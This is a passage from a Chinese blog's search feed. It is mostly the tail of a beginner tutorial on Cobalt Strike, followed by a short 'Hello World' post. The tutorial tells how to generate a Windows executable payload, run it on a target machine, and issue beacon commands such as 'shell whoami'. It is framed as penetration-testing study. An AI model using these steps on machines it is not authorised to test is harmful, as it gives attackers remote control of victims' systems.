<p><img src="/2020/01/31/Cobalt%20Strike%20%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/cs3.jpg" alt></p>
<p>生成payload</p>
<p>点击菜单栏中的Attacks-&gt;Packages-&gt;Windows Executable</p>
<p>选择payload的类型</p>
<p><img src="/2020/01/31/Cobalt%20Strike%20%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/cs4.jpg" alt></p>
<p>生成</p>
<p>将生成好的exe文件放入到目标机中，运行，在客户端就可以看到，目标上线。</p>
<p><img src="/2020/01/31/Cobalt%20Strike%20%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/cs5.jpg" alt></p>
<p>右键点击目标机，选择Interact进行连接目标机，得到一个beacon的命令行操作界面。</p>
<p>输入help可以看到有关beacon的各种命令，感觉有点像Empire的操作界面，使用cmd命令的时候前面需要加个 shell。如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell whoami</span><br></pre></td></tr></table></figure>

<p>返回的是目标的用户名。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了Cobalt Strike的一些基础的操作，Cobalt Strike是一款功能很强大的渗透测试框架，总的来说是一款使用体验很好的框架，CS的其他功能等后续的文章在做介绍。</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/01/01/hello-world/</url>
    <content><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World!"></a>Hello World!</h1><p>“Hello World”</p>
<a id="more"></a>

<p>2020年，21世纪20年代的开启，在新的时期，决定重拾博客。</p>
<p>“与其感慨前路难行，不如马上出发”。</p>
<p><img src="/2020/01/01/hello-world/lz.jpg" alt></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>随想</tag>
      </tags>
  </entry>
</search>
